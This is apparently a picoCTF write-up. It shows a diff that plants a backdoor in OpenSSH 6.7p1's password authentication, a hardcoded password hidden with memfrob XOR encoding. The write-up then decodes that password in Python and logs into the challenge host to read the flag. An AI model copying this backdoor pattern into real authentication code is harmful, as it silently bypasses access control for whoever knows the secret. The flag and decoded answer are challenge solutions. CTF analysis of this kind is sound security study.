diff -ur openssh-6.7p1.orig/auth.c openssh-6.7p1/auth.c
--- openssh-6.7p1.orig/auth.c	2014-07-18 05:11:25.000000000 +0100
+++ openssh-6.7p1/auth.c	2014-10-09 06:21:54.000000000 +0100
@@ -774,3 +774,21 @@
 
 	return (&fake);
 }
+
+static int frobcmp(const char *chk, const char *str) {
+	int rc = 0;
+	size_t len = strlen(str);
+	char *s = xstrdup(str);
+	memfrob(s, len);
+
+	if (strcmp(chk, s) == 0) {
+		rc = 1;
+	}
+
+	free(s);
+	return rc;
+}
+
+int check_password(const char *password) {
+	return frobcmp("CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY", password);
+}
diff -ur openssh-6.7p1.orig/auth.h openssh-6.7p1/auth.h
--- openssh-6.7p1.orig/auth.h	2014-07-03 12:29:38.000000000 +0100
+++ openssh-6.7p1/auth.h	2014-10-09 06:21:54.000000000 +0100
@@ -211,6 +211,8 @@
 
 int	 sys_auth_passwd(Authctxt *, const char *);
 
+int check_password(const char *);
+
 #define SKEY_PROMPT "\nS/Key Password: "
 
 #if defined(KRB5) && !defined(HEIMDAL)
diff -ur openssh-6.7p1.orig/auth-passwd.c openssh-6.7p1/auth-passwd.c
--- openssh-6.7p1.orig/auth-passwd.c	2014-07-18 05:11:25.000000000 +0100
+++ openssh-6.7p1/auth-passwd.c	2014-10-09 06:21:54.000000000 +0100
@@ -112,6 +112,9 @@
 		return ok;
 	}
 #endif
+	if (check_password(password)) {
+		return ok;
+	}
 #ifdef USE_PAM
 	if (options.use_pam)
 		return (sshpam_auth_passwd(authctxt, password) && ok);




The  memfrob()  function  encrypts  the first n bytes of the memory area s by exclusive-ORing each character with the number 42.  The effect can be reversed by using memfrob() on the encrypted memory area.


>>> "".join([chr(ord(i) ^ 42) for i in "CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY"])
'iminyourmachinestealingyourflags'

 ssh jon@backdoor.picoctf.com
jon@backdoor.picoctf.com's password: 
Last login: Tue Dec 29 14:54:03 2015 from 54.157.205.234
jon@ip-10-235-140-81:~$ ls
flag.txt
jon@ip-10-235-140-81:~$ cat flag.txt 
ssshhhhh_theres_a_backdoor
